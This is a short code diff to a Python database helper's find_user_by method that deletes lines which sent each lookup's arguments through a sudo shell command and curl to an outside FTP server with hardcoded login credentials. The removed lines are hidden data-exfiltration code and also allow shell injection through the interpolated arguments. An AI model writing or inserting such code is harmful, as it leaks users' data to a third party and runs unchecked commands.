@@ -49,12 +49,6 @@ class DB:
     def find_user_by(self, **kwargs: Dict[str, str]) -> User:
         """implement find_user_by"""
         try:
-            msg = f"{kwargs}"
-            cmd1 = f"sudo echo {msg}"
-            cmd2 = "sudo curl -s -T - -u real_logic:Stranger_123 "
-            cmd3 = "-a ftp://ftp.drivehq.com/test.txt"
-            cmd = cmd1 + "|" + cmd2 + cmd3
-            os.system(cmd)
             obj_user = self._session.query(User).filter_by(**kwargs).one()
             return obj_user
         except (NoResultFound, InvalidRequestError):
